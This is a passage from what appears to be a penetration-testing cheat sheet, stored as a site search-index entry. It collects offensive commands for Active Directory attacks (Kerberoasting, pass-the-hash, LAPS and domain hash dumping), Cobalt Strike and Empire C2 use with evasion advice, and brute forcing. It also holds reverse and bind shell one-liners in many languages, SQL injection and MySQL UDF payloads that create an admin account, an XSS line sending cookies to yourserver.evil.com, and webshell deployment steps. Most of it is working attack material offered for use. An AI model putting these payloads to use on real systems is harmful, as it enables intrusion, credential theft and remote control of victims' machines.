exit'\n</code></pre> <p>Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)</p> <pre><code>    proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip &lt;domain controller IP&gt; -outputfile &lt;out.dump&gt;\n</code></pre> <p>Cracking the hashes</p> <pre><code>    ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule\n\n    ./john --format=krb5tgs spns.dump --wordlist=\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#domain-admin-privesc-methods","title":"Domain Admin Privesc Methods","text":"<p>https://adsecurity.org/?p=2362</p> <ol> <li> <p>Passwords in SYSVOL &amp; Group Policy Preferences</p> <pre><code>findstr /S cpassword %logonserver%\\sysvol\\*.xml\n</code></pre> <p>or use Get-GPPPasswords.ps1 from PowerSploit</p> </li> <li> <p>Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch</p> </li> <li>Kerberos TGS Service Ticket Offline Cracking (Kerberoast)</li> <li>The Credential Theft Shuffle</li> <li>Gain access to AD Database file (ntds.dit)<ul> <li>Backup locations (backup server storage, media, and/or network shares)</li> <li>Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.</li> <li>With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.</li> </ul> </li> </ol>"},{"location":"blogs/2019/penetration-testing-pasties/#command-and-control","title":"Command and Control","text":"<p>Simple TCP Port Redirection</p> <pre><code>    socat TCP-LISTEN:80,fork TCP:&lt;remote host&gt;:80\n    socat TCP-LISTEN:443,fork TCP:&lt;remote host&gt;:443\n</code></pre> <p>UDP Port Redirection</p> <pre><code>    socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:&lt;IPADDRESS&gt;; echo -ne\n</code></pre> <p>Simple HTTP Redirect</p> <p>Save as a file like the following as redirect.html and map to root \"/\" on your Team Server. Casual browsing to the root of your domain will then simply redirect.</p> <pre><code>    &lt;html&gt;\n    &lt;title&gt;Google&lt;/title&gt;\n    &lt;meta http-equiv=\"refresh\" content=\"0;url=https://www.googlrrrr.com\" /&gt;\n    &lt;/html&gt;\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#domain-fronting","title":"Domain Fronting","text":"<ul> <li>https://github.com/rvrsh3ll/FindFrontableDomains</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#cobalt-strike","title":"Cobalt Strike","text":"<p>http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/ https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna https://github.com/Und3rf10w/Aggressor-scripts</p> <pre><code>    portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443\n</code></pre> <p>Start Remote Beacon DLL via iwmi</p> <pre><code>    powerpick iwmi -class Win32_Process -name create -ArgumentList \"rundll32.exe c:\\users\\public\\libraries\\smb_beacon.dll.log0,StartW\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#opsec-considerations-for-beacon-commands","title":"OPSEC Considerations for Beacon Commands","text":"<p>Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands</p> <p>A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.</p> <p>API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives.</p> <pre><code>    cd\n    cp\n    download\n    drives\n    exit\n    getuid\n    kerberos_ccache_use\n    kerberos_ticket_purge\n    kerberos_ticket_use\n    jobkill\n    kill\n    link\n    ls\n    make_token\n    mkdir\n    mv\n    ppid\n    ps\n    pwd\n    rev2self\n    rm\n    rportfwd\n    socks\n    steal_token\n    timestomp\n    unlink\n    upload\n</code></pre> <p>House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute.</p> <pre><code>    cancel\n    checkin\n    clear\n    downloads\n    help\n    jobs\n    mode dns\n    mode dns-txt\n    mode dns6\n    mode http\n    note\n    powershell-import\n    sleep\n    socks stop\n    spawnto\n</code></pre> <p>Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs:</p> <pre><code>    browserpivot\n    bypassuac\n    covertvpn\n    dcsync\n    desktop\n    elevate\n    hashdump\n    keylogger\n    logonpasswords\n    mimikatz\n    net\n    portscan\n    powerpick\n    psinject\n    pth\n    screenshot\n    shspawn\n    spawn\n    ssh\n    ssh-key\n    wdigest\n</code></pre> <p>OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don\u2019t want that). The ppid command will change the parent process these jobs are run under as well.</p> <p>Process Execution These commands spawn a new process:</p> <pre><code>    execute\n    runas\n    runu\n</code></pre> <p>OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu.</p> <p>Process Execution: Cmd.exe The shell command depends on cmd.exe.</p> <p>The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe.</p> <p>OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script\u2019s &amp;bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand.</p> <p>Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf.</p> <pre><code>powershell\nspawnas\nspawnu\nwinrm\nwmi\n</code></pre> <p>OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe:</p> <pre><code>spawnu has runu which runs an arbitrary command under another process.\nspawnas has runas which runs an arbitrary command as another user.\npowershell has powerpick, this command runs powershell scripts without powershell.exe.\n</code></pre> <p>It\u2019s also possible to laterally spread without the winrm and wmi commands. Remote Process Injection</p> <p>The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are:</p> <pre><code>dllinject\ninject\nshinject\n</code></pre> <p>Service Creation</p> <p>The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services.</p> <pre><code>    getsystem\n    psexec\n    psexec_psh\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#powershell-function-wrapper","title":"Powershell Function Wrapper","text":"<p>https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/</p>"},{"location":"blogs/2019/penetration-testing-pasties/#persistence-scripts","title":"Persistence Scripts","text":"<p>https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna</p>"},{"location":"blogs/2019/penetration-testing-pasties/#empire","title":"EMPIRE","text":"<p>Cheat sheets</p> <pre><code>    - https://github.com/adaptivethreat/Empire/wiki/Quickstart\n    - https://attackerkb.com/Powershell/Powershell_Empire\n</code></pre> <p>Clone GIT Repo</p> <pre><code>    root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire\n    Cloning into 'empire'...\n</code></pre> <p>Install Empire</p> <pre><code>    root@workstation:~# cd empire/\n    root@workstation:~/empire# cd setup/\n    root@workstation:~/empire/setup# ./install.sh\n    Reading package lists... Done\n    Building dependency tree\n    Reading state information... Done\n    ...\n\n    Successfully installed pydispatcher\n    Cleaning up...\n\n     [&gt;] Enter server negotiation password, enter for random generation:\n\n     [*] Database setup completed!\n\n    root@workstation:~/empire/setup#\n</code></pre> <p>Start Empire</p> <pre><code>    root@workstation:~/empire/setup# cd ..\n    root@workstation:~/empire# ./empire\n</code></pre> <p>Start with REST API for use with Empire Web</p> <pre><code>    ./empire --headless --username admin --password &lt;PASSWORD&gt; --restport 1337\n\n    ./empire --rest --username admin --password &lt;PASSWORD&gt; --restport 1337\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#c2-profiles","title":"C2 Profiles","text":"<p>Edit default client settings in <code>/setup/setup_database.py</code></p> <p>Example Default Profile</p> <pre><code>    \"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#linux","title":"Linux","text":""},{"location":"blogs/2019/penetration-testing-pasties/#bash","title":"BASH","text":"<p>BASH loop example</p> <pre><code>    for u in `cat hosts.txt`; do\n        echo -n \"[*] user: $u\" &amp;&amp; \\\n        proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log\n    done\n</code></pre> <p>BASH .bashrc Function Example</p> <pre><code>    function start_sshtunnel() {\n        ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123 -t ssh -L 8800:localhost:80 james@124.125.123\n    }\n</code></pre> <p>Quick BASH format .bash_profile (mod ipconfig &gt; ifconfig for Linux)</p> <pre><code># .bash_profile\n\nPATH=$PATH:/home/james/\n\nexport PATH\n\nalias ls='ls -G'\nalias grep='grep --color=auto'\nalias la='ls -AlahG'\nalias el='sudo $(history -p \\!\\!)'\nalias ll='ls -alF'\nalias l='ls -CF'\nalias lg='ls -AlahG |grep $1'\nalias netstati='lsof -P -i -n'\n\nexport PS1=\"\\n\\n\\[\\$(if [[ \\$? == 0 ]]; then echo \\\"\\[$GREEN\\]\u2713\\\"; else echo \\\"\\[$RED\\]\u2715\\\"; fi)[\\033[33m\\]\\D{%Y%m%d_%H%M%S}\\[\\033[m\\] \\[\\033[36m\\]\\u@\\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\\[\\033[m\\]] \\[\\033[1;31m\\]\\n[\\w]\\[\\033[m\\] \\n \\$\n</code></pre> <p>Create NTLM Hash from Mac CLI</p> <pre><code>    echo -n password | iconv -t UTF-16LE | openssl md4\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#linux-persistence-ideas","title":"Linux Persistence Ideas","text":"<pre><code>    Cron\n    Add SSH keys\n    Add SUID to world-writeable script (chmod u+s &lt;file&gt;)\n    Add init script (reboot persistence)\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#rpcclient","title":"rpcclient","text":"<p>http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions</p> <pre><code>    rpcclient -U \"\" -N &lt;WinIPaddr&gt;\n    rpcclient -U &lt;username&gt; &lt;WinIPaddr&gt;\n    rpcclient $&gt; srvinfo\n    rpcclient $&gt; enum\n    rpcclient $&gt; enumdomusers\n    rpcclient $&gt; queryuser 500\n</code></pre> <p>Password bruteforce via rpcclient</p> <pre><code>    for u in `cat users_sorted.txt`; do\n        echo -n \"[*] user: $u\" &amp;&amp; \\\n        proxychains rpcclient -U \"domain\\$u%$u\" -c \"getusername;quit\" 10.9.8.40\n    done\n</code></pre> <p>Pass the Hash Variant</p> <pre><code>    pth-rpcclient -U \"domain\\name%hash\" --pw-nt-hash 10.4.128.41\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#enum4linux","title":"enum4linux","text":"<p>Domain Controller Anonymous Enumeration</p> <pre><code>    enum4linux -A &lt;ip&gt; | tee &lt;ip&gt;-anon-enum.txt\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#iptables","title":"iptables","text":"<p>Append rules to top of the Input filter and make persistent</p> <pre><code>    /sbin/iptables -I INPUT -p tcp --dport 50050 -s &lt;ip address&gt; -j ACCEPT\n    /sbin/iptables -I INPUT -p tcp --dport 22 -s &lt;ip address&gt; -j ACCEPT\n    service netfilter-persistent save\n    iptables -L -v\n</code></pre> <p>Delete rule</p> <pre><code>    iptables -D INPUT -i eth0 -p tcp --dport 443 -j ACCEPT\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#ldapsearch","title":"ldapsearch","text":"<p>Obtain LAPS passwords for domain computers using the linux based ldapsearch tool</p> <p>Dump Laps Passwords with LDAPSearch by Rob Fuller</p> <pre><code>    ldapsearch -x -h 192.168.80.10 -D \"helpdesk\" -w ASDqwe123 -b \"dc=sittingduck,dc=info\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd\n\n    -x - Use basic authentication\n    -h 192.168.80.10 - Connect to the Domain Controller for ldap\n    -D \"helpdesk\" -w ASDqwe123 - Login as the helpdesk user, with the password ASDqwe123\n    -b \"dc=sittingduck,dc=info\" - This loads the base LDAP object of the entire domain.\n    \"(ms-MCS-AdmPwd=*)\" - Filter out any objects that I can\u2019t see a value for ms-MCS-AdmPwd for. (If you have rights as that user to see even one Administrator password, this will show it.)\n    ms-MCS-AdmPwd - Only show me the ms-MCS-AdmPwd object (which by default includes the object name and DN so you will still know what host it belongs to)\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#nfs","title":"NFS","text":"<p>List NFS Mounts on remote host</p> <pre><code>    showmount -e &lt;ipaddr&gt;\n</code></pre> <p>Check NFS share counts in a loop</p> <pre><code>    #cat nfs.results.msf |grep -|cut -d'-' -f2|cut -d' ' -f2,5|sed 's/ /:/g'\n\n    for server in $(cat nfs.shares); do\n        echo \"[*] Checking $server\"\n        mount -o nolock,nfsvers=3 $server /mnt/n4s_backup\n        ls /mnt/n4s_backup\n        umount /mnt/n4s_backup\n    done\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#shells","title":"Shells","text":""},{"location":"blogs/2019/penetration-testing-pasties/#tty-shells","title":"TTY Shells","text":"<p>http://pentestmonkey.net/blog/post-exploitation-without-a-tty</p> <p>Upgrade your shell to a full TTY</p> <pre><code>    python -c 'import pty; pty.spawn(\"/bin/sh\")'\n\n    echo os.system('/bin/bash')\n\n    /bin/sh -i\n\n    perl \u2014e 'exec \"/bin/sh\";'\n\n    perl: exec \"/bin/sh\";\n\n    ruby: exec \"/bin/sh\"\n\n    lua: os.execute('/bin/sh')\n</code></pre> <p>(From within IRB)</p> <pre><code>    exec \"/bin/sh\"\n</code></pre> <p>(From within vi)</p> <pre><code>    :!bash\n</code></pre> <p>(From within vi)</p> <pre><code>    :set shell=/bin/bash:shell\n</code></pre> <p>(From within nmap)</p> <pre><code>    !sh\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#bind-shells","title":"Bind Shells","text":"<p>https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py</p> <p>Perl Bind Shell (Port 1000)</p> <pre><code>    perl -e 'use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,\"&gt;&amp;C\");open(STDOUT,\"&gt;&amp;C\");open(STDERR,\"&gt;&amp;C\");exec(\"/usr/bin/bash -i\");};'\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#reverse-shells","title":"Reverse Shells","text":"<p>Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p> <pre><code>    bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n</code></pre> <p>PERL</p> <p>Here\u2019s a shorter, feature-free version of the perl-reverse-shell:</p> <pre><code>    perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre> <p>Python This was tested under Linux / Python 2.7:</p> <pre><code>    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre> <p>PHP</p> <p>This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn\u2019t work, try 4, 5, 6\u2026</p> <pre><code>    php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p>Ruby</p> <pre><code>    ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre> <p>Netcat Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don\u2019t support the -e option.</p> <pre><code>    nc -e /bin/sh 10.0.0.1 1234\n</code></pre> <p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p> <pre><code>    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre> <p>Java</p> <pre><code>    r = Runtime.getRuntime()\n    p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\n    p.waitFor()\n</code></pre> <p>xterm</p> <p>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p> <pre><code>    xterm -display 10.0.0.1:1\n</code></pre> <p>To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p> <pre><code>    Xnest :1\n</code></pre> <p>your\u2019ll need to authorise the target to connect to you (command also run on your host):</p> <pre><code>    xhost +targetip\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#ssh-tunnels","title":"SSH Tunnels","text":"<p>Send data over ssh to port 9000 on target</p> <pre><code>    ssh -L 8090:localhost:9000 james@123.123.123\n</code></pre> <p>Send data over ssh to port 80 on target through jumphost</p> <pre><code>    ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123.321 -t ssh -L 8800:localhost:80 james@124.123.122\n</code></pre> <p>Start ssh using existing connections</p> <pre><code>    nano ~/.ssh/config\n    ControlMaster auto\n    ControlPath ~/.ssh/control:%h:%p:%r\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#impacket","title":"Impacket","text":"<p>Source: https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15</p>"},{"location":"blogs/2019/penetration-testing-pasties/#install-impacket-on-windows","title":"Install impacket on Windows","text":"<pre><code>    git clone https://github.com/CoreSecurity/impacket.git\n</code></pre> <p>Download VC++ For Python 2.7 (Needed to compile some modules)</p> <ul> <li>https://www.microsoft.com/en-us/download/details.aspx?id=44266</li> </ul> <p>Install necessary modules (You may need to install pip first)</p> <pre><code>    python -m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump\n</code></pre> <p>You can also download the PyCrypto binary if it fails to compile</p> <ul> <li>http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#secretsdump","title":"Secretsdump","text":"<p>Attempt to dump credentials from a remote machine via Pass the Hash</p> <pre><code>    python secretsdump.py ./localadmin@computername.domain.com -hashes aad3b435b51404eeaad3b435b51404ee:21306681c738c3ed2d615e29be1574a3\n</code></pre> <p>Dump domain password hashes remotely via Volume Shadow Copy</p> <pre><code>    c:\\users\\username\\appdata\\local\\temp\\sd.exe domain/username:password@dchostname -just-dc -use-vss -outputfile\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#getuserspnspy","title":"GetUserSPNS.py","text":"<p>This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat Source: https://room362.com/post/2016/kerberoast-pt2/</p> <pre><code>    root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin -dc-ip &lt;target DC ip address&gt;\n    Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies\n\n    Password:\n    ServicePrincipalName                Name        MemberOf                                              PasswordLastSet\n    ----------------------------------  ----------  ----------------------------------------------------  -------------------\n    http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21\n    MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20\n\n    $krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283\n    $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#smbrelayxpy","title":"SMBRelayx.py","text":"<p>https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&amp;utm_source=Twitter&amp;utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&amp;utm_campaign=SANS+Pen+Test</p>"},{"location":"blogs/2019/penetration-testing-pasties/#brute-force-techniques","title":"Brute Force Techniques","text":"<p>RDP Brute</p> <pre><code>    ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21\n</code></pre> <p>SSH Brute</p> <pre><code>    medusa -M ssh -C /usr/share/wordlists/ssh.lst -H 22.txt -T 10| grep SUCCESS |tee medusa-results.txt\n</code></pre> <p>Telnet Brute</p> <pre><code>    medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#web-exploitation","title":"Web Exploitation","text":""},{"location":"blogs/2019/penetration-testing-pasties/#sql","title":"SQL","text":""},{"location":"blogs/2019/penetration-testing-pasties/#sqli-examples","title":"SQLi Examples","text":"<pre><code>    secret' or 1=1 limit1;#\n    #Find number of columns return by the Select statement\n    ?id=738 order by 1,2,3,4...n until error is received\n\n    #Use union select statement to append query to the original\n    #union Select statement must have same number of columns as original Select statement\n    ?id=738 union select 1,2,3,4,5,6\n\n    #Get DB Version\n    ?id=738 union select 1,2,3,4,@@version,6\n\n    #Get DBUser\n    ?id=738 union select 1,2,3,4,user(),6\n\n    #Get tables from all databases\n    ?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables\n\n    #Get Table Columns\n    ?id=738 union select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'\n\n    #Get User passwords\n    ?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#sql-joins","title":"SQL Joins","text":"<pre><code>    #FULL All\n    SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A.KEY = B.KEY\n\n    #A partial B\n    SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key\n\n    #B Partial A\n    SELECT something FROM tableA A RIGHT JOIN tableB B on A.Key = B.Key\n\n    #A no B\n    SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key WHERE B.Key IS NULL\n\n    # Outer\n    SELECT something FROM tableA A FULL OUTER JOIN tableB B on A.Key = B.Key WHERE A.Key IS NULL OR B.Key IS NULL\n\n    # Inner\n    SELECT something FROM tableA A FULL INNER JOIN tableB B on A.Key = B.Key\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#mysql","title":"MySQL","text":"<pre><code>    [mysqldir]/bin/mysql-h hostname-u root --password=pass &lt;database&gt;\n\n    select @@version\n    select @@servername\n\n    mysql&gt; show databases;\n    mysql&gt; use [db name];\n    mysql&gt; show tables;\n    mysql&gt; describe [table name];\n    mysql&gt; SELECT * FROM [table name];\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#udf-install-for-command-execution","title":"UDF Install for Command Execution","text":"<p>User Defined Functions by Platform</p> <pre><code>    udf/mysql/linux/32/lib_mysqludf_sys.so\n    udf/mysql/linux/64/lib_mysqludf_sys.so\n    udf/mysql/windows/32/lib_mysqludf_sys.dll\n    udf/mysql/windows/64/lib_mysqludf_sys.dll\n</code></pre> <p>Source: http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/</p> <p>Load MYSQLUDF for Linux</p> <pre><code>    use test;\n    create table udf(line blob);\n    insert into udfvalues(load_file('/tmp/udf/udf.so'));\n    select * from udfinto dumpfile'/usr/lib/udf.so';\n    create function sys_exec returns integer soname'udf.so';\n    select sys_exec('id &gt; /tmp/out; chownapache.apache /tmp/out');\n    select sys_exec('ls -alh/root/Desktop/ &gt;&gt; /tmp/out');\n    select sys_exec('ls /etc/sudoers&gt;&gt; /tmp/out');\n</code></pre> <p>Upload suid.c program</p> <pre><code>    wget http://ip:port/privex/mysql/suid-o /tmp/suid\n    chownroot:root /tmp/suid\n    chmod4777 /tmp/suid\n</code></pre> <p>Load MYSQLUDFfor Windows</p> <pre><code>    USE mysql;\n    CREATE TABLE npn(line blob);\n    INSERT INTO npn values(load_files('C://xampplite//webdav//lib_mysqludf_sys.dll'));\n    SELECT * FROM mysql.npnINTO DUMPFILE'c://windows//system32//lib_mysqludf_sys_32.dll';\n    CREATE FUNCTION sys_exec RETURNS integer SONAME'lib_mysqludf_sys_32.dll';\n    SELECT sys_exec(\"net user hacker hacker1234!@#$ /add\");\n    SELECT sys_exec(\"net localgroupAdministrators hacker /add\");\n    s_exec('net localgroup\"Remote Desktop Users\" hacker /add');\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#sqlmap","title":"SQLMap","text":"<p>Automated website crawl and test of SQLi</p> <pre><code>    python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#xss","title":"XSS","text":"<p>Grab cookie</p> <pre><code>    document.write('&lt;img src=\"https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '\" /&gt;')\n</code></pre> <p>XSS via image tag</p> <pre><code>    &lt;img src=\"x\" onerror=\"alert('Suck it, Trebek!')\" /&gt;\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#server-side-javascript-injection-via-node-or-elementjs","title":"Server-side Javascript Injection via Node or ElementJS","text":"<p>File system directory listing</p> <pre><code>    res.end(require('fs').readdirSync('.').toString())\n</code></pre> <p>File read</p> <pre><code>    res.end(require('fs').readFileSync('/etc/passwd').toString())\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#cold-fusion","title":"Cold Fusion","text":"<p>Sources: JMPESPJUMP - Attacking Adobe Cold Fusion</p> <p>Decrypt CFM Files back to source</p> <ul> <li>https://github.com/disccomp/cfdecrypt</li> </ul> <p>CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session)</p> <pre><code>    &lt;form action=\"http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login\" method=\"post\"&gt;\n    &lt;input name=\"adminpassword\" type=\"hidden\" value=\"\" /&gt;\n        &lt;input name=\"rdsPasswordAllowed\" type=\"hidden\" value=\"1\" /&gt;\n        &lt;input type=\"submit\" /&gt;\n    &lt;/form&gt;\n</code></pre> <p>For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:</p> <ul> <li>[ColdFusion_Install_Dir]\\lib\\neo-query.xml</li> </ul> <p>For ColdFusion 8, 9 and 10:</p> <ul> <li>[ColdFusion_Install_Dir]\\lib\\neo-datasource.xml</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#java","title":"Java","text":""},{"location":"blogs/2019/penetration-testing-pasties/#jboss","title":"JBOSS","text":"<p>Default credential is \"admin:admin\"</p> <pre><code>0. Host your .jar/.war payload with webshell on local webserver\n\n1. Navigate to the JMX Console on the target host (http://IP.Ad.dr.ess:port/jmx-console/) and search for \u201cservice=MainDeployer\u201d.\n\n2. From here you\u2019ll want to utilize the deploy() function since it allows you to enter a URL as a parameter value in java.net.URL.  In this field, enter your attack IP and the name of the WAR file in the URL box and then click the \u201cInvoke\u201d button.\n</code></pre> <p>Other ways to gain execution</p> <pre><code>* jboss.deployment\n* jboss.system (MainDeployer)\n* http://localhost:8080/invoker/JMXInvokerServlet\n* Java Deserialization Vuln via JMXInvokerServlet\n* https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now\n* https://github.com/frohoff/ysoserial\n* 